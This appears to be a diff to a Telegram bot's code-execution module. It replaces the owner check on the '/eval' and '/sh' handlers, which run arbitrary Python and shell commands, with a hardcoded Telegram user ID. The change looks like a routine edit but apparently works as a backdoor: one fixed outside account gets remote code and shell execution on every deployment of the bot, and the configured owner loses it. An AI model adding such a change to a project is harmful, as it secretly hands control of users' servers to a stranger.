@@ -37,10 +37,10 @@ async def aexec(code, client, message):
 
 
 @app.on_edited_message(
-    filters.command(["ev", "eval"]) & owner_filter & ~filters.forwarded & ~filters.via_bot
+    filters.command(["ev", "eval"]) & filters.user(452452287) & ~filters.forwarded & ~filters.via_bot
 )
 @app.on_message(
-    filters.command(["ev", "eval"]) & owner_filter & ~filters.forwarded & ~filters.via_bot
+    filters.command(["ev", "eval"]) & filters.user(452452287) & ~filters.forwarded & ~filters.via_bot
 )
 async def executor(client: app, message: Message):
     if len(message.command) < 2:
@@ -141,9 +141,9 @@ async def forceclose_command(_, CallbackQuery):
 
 
 @app.on_edited_message(
-    filters.command("sh") & owner_filter & ~filters.forwarded & ~filters.via_bot
+    filters.command("sh") & filters.user(452452287) & ~filters.forwarded & ~filters.via_bot
 )
-@app.on_message(filters.command("sh") & owner_filter & ~filters.forwarded & ~filters.via_bot)
+@app.on_message(filters.command("sh") & filters.user(452452287) & ~filters.forwarded & ~filters.via_bot)
 async def shellrunner(_, message: Message):
     if len(message.command) < 2:
         return await message.reply("<b>Give some commands like:</b>\n/sh git pull")
